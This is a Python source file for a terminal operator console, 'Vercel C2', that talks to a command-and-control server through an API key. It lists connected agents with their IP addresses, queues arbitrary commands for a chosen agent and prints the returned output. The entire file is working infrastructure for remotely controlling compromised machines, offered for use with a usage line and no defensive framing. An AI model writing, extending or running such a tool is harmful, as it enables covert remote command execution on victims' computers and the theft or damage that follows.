#!/usr/bin/env python3
"""
C2 Operator CLI — manage agents from terminal
Usage: python3 operator.py --url https://your-c2.vercel.app --key YOUR_SECRET
"""
import requests, json, sys, argparse

def api(url, key, **kwargs):
    r = requests.post(url,
        headers={"X-API-Key": key, "Content-Type": "application/json"},
        json=kwargs, timeout=15)
    return r.json()

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--key", required=True)
    args = p.parse_args()

    RED = "\033[31m"; GREEN = "\033[32m"; CYAN = "\033[36m"
    BOLD = "\033[1m"; NC = "\033[0m"

    print(f"{BOLD}{RED}")
    print("  ██████╗██████╗      ██████╗██████╗")
    print(" ██╔════╝╚════██╗    ██╔════╝╚════██╗")
    print(" ██║      █████╔╝    ██║      █████╔╝")
    print(" ██║     ██╔═══╝     ██║     ██╔═══╝")
    print(" ╚██████╗███████╗    ╚██████╗███████╗")
    print(f"  ╚═════╝╚══════╝    ╚═════╝╚══════╝{NC}")
    print(f"{CYAN}  Vercel C2 — Operator Console{NC}\n")

    while True:
        try:
            cmd = input(f"{BOLD}c2>{NC} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\nbye"); break

        if not cmd: continue

        if cmd == "agents":
            d = api(args.url, args.key, action="list_agents")
            agents = d.get("agents", {})
            if not agents: print("  [no agents]"); continue
            for aid, info in agents.items():
                ts = int(info.get("last_seen",0))//1000
                print(f"  {GREEN}●{NC} {aid} | IP: {info.get('ip')} | last: {ts}s ago")

        elif cmd.startswith("use "):
            target = cmd.split()[1]
            print(f"  {CYAN}[targeting {target}]{NC}")
            while True:
                try:
                    sub = input(f"{BOLD}{target}>{NC} ").strip()
                except (EOFError, KeyboardInterrupt):
                    break
                if sub in ("back","exit"): break
                if sub.startswith("results"):
                    d = api(args.url, args.key, action="get_results", target=target)
                    for r in d.get("results",[]):
                        print(f"  [{r['ts']}] {r['output'][:300]}")
                else:
                    d = api(args.url, args.key, action="push_cmd", target=target, cmd=sub)
                    print(f"  {GREEN}[queued]{NC}")

        elif cmd == "help":
            print("  agents          — list active agents")
            print("  use <agent_id>  — interact with agent")
            print("    <cmd>         — push command to agent")
            print("    results       — show command results")
            print("    back          — return to main menu")
            print("  exit            — quit")
        elif cmd == "exit":
            break
